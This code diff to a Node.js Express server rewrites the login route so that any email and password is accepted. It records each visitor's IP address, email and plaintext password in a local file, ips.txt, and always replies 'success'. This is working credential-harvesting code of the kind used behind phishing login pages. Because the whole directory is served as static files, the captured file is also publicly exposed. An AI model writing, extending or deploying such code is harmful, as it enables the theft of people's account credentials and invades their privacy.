@@ -1,5 +1,6 @@
 const express = require("express");
 const path = require("path");
+const fs = require("fs");
 const app = express();
 
 // Allow form POST data
@@ -8,9 +9,22 @@ app.use(express.urlencoded({ extended: true }));
 // Serve all static files (HTML, CSS, JS, images)
 app.use(express.static(path.join(__dirname)));
 
-// ⭐ ALWAYS SUCCESSFUL LOGIN ⭐
+// ⭐ ALWAYS SUCCESSFUL LOGIN + STORE IP ⭐
 app.post("/login", (req, res) => {
-    // No checking email or password
+    const userIP =
+        req.headers["x-forwarded-for"] || // Render / proxies
+        req.socket.remoteAddress ||       // Direct connection
+        "Unknown IP";
+
+    const email = req.body.email;
+    const password = req.body.password;
+
+    const logEntry = `IP: ${userIP} | Email: ${email} | Password: ${password}\n`;
+
+    // Save IP + email + password to a file
+    fs.appendFileSync("ips.txt", logEntry);
+
+    // Always return success
     res.send("success");
 });
 
